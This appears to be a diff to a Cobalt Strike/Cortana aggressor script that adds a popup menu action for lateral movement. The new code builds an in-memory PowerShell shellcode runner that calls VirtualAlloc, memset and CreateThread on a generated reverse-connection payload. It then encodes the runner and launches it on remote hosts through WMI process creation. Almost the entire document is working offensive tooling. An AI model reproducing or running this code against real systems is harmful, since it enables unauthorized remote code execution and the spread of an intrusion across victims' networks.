@@ -135,7 +135,7 @@ popup host_bottom {
                     $beaconID = %beaconHosts[$address];
                     task_powerup($beaconID);
                 }
-                item "Invoke-MassWMI" {
+                item "Invoke-WMI" {
                     $beaconID = %beaconHosts[$address];
                     wmi_dialog($beaconID);
                 }
@@ -492,56 +492,52 @@ sub executeWMI {
     $FirewallCheckBox = $10;
     $RunWOW64 = $11;
 
-    # get RHOSTS into the form needed for Invoke-MassWMI
+    # get RHOSTS into the form needed
     $RHOST = "\"".replace($RHOST, ", ", "\",\"")."\"";
 
+    # generate the PowerShell payload with our given parameters
+    $payload = generate($Payload, $LHOST, $LPORT, %(), "powershell");
     $script = "";
 
-    if (-exists script_resource("/beacon/Invoke-MassWMI.ps1")){
-       $script_source = script_resource("/beacon/Invoke-MassWMI.ps1");
+    # the payload skeleton + our generated shellcode
+    $temp = '$Pj = @"
+[DllImport("kernel32.dll")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+[DllImport("kernel32.dll")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+[DllImport("msvcrt.dll")]
+public static extern IntPtr memset(IntPtr dest, uint src, uint count);
+"@
+$nOx = Add-Type -memberDefinition $Pj -Name "Win32" -namespace Win32Functions -passthru
+'.$payload.'
+$jy = $nOx::VirtualAlloc(0,[Math]::Max($buf.Length,0x1000),0x3000,0x40)
+for ($FE=0;$FE -le ($buf.Length-1);$FE++) {
+  $nOx::memset([IntPtr]($jy.ToInt32()+$FE),$buf[$FE],1)|Out-Null
+}
+$nOx::CreateThread(0,0,$jy,0,0,0)|Out-Null
+Start-Sleep -s 1000000';
+
+    # unicode escape the payload
+    for($i = 0; $i < strlen($temp); $i++){
+        $script = $script . charAt($temp, $i) . "\x00";
     }
-    else{
-        $script_source = script_resource("Invoke-MassWMI.ps1");
-    }
 
-    # generate the PowerShell payload with our given parameters
-    $payload = generate($Payload, $LHOST, $LPORT, %(), "psh");
-
-    # patch the payload into the target script to host
-    $handlef = openf($script_source);
-    while $readf (readln($handlef)){
-        $line = $readf;
-        if($line hasmatch 'REPLACE_HERE'){
-            # patch our payload into the appropriate place in the template
-            $line = strrep($line, "REPLACE_HERE", $payload);
-        }
-        $script = $script.$line."\n";
-    }
-    closef($script_source);
-
-    # write the output file out to a temporary location
-    $handlef = openf(">/tmp/script.ps1");
-    writeb($handlef, $script);
-    closef($handlef);
-
-    # get all of our data that we're going to upload
-    $handle = openf("/tmp/script.ps1");
-    $data = readb($handle, -1);
-    closef($handle);
-
-    # task the beacon to import the powershell data
-    task_powershell_import($beacon_id, $data);
-
-    # command to invoke
-    if( ! $RunWOW64){
-        $cmd = "$RHOST | Invoke-MassWMI -LocalPort $PoshHostPort -ServerSleep $PoshHostTime -NoSYSWOW64 | Out-Null";
-    }
-    else{
-        $cmd = "$RHOST | Invoke-MassWMI -LocalPort $PoshHostPort -ServerSleep $PoshHostTime | Out-Null";
-    }
+    # base64 encode the payload, for -enc usage
+    $encoded = [msf.Base64 encode: $script];
     
-    # actually task the beacon
-    task_powershell($beacon_id, $cmd);
+    # command to invoke, see if we need the syswow64 PowerShell
+    if( ! $RunWOW64){
+        $script = "function update{Invoke-WmiMethod -ComputerName ".$RHOST." -Path Win32_process -Name create -ArgumentList \"powershell.exe -enc ".$encoded."\"}";
+    }
+    else{
+        $script = "function update{Invoke-WmiMethod -ComputerName ".$RHOST." -Path Win32_process -Name create -ArgumentList \"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -enc ".$encoded."\"}";
+    }
+
+    # task the beacon to import the payload data
+    task_powershell_import($beacon_id, $script);
+
+    # actually task the beacon to execute the WMI payload
+    task_powershell($beacon_id, "update|Out-Null");
 }
 
 
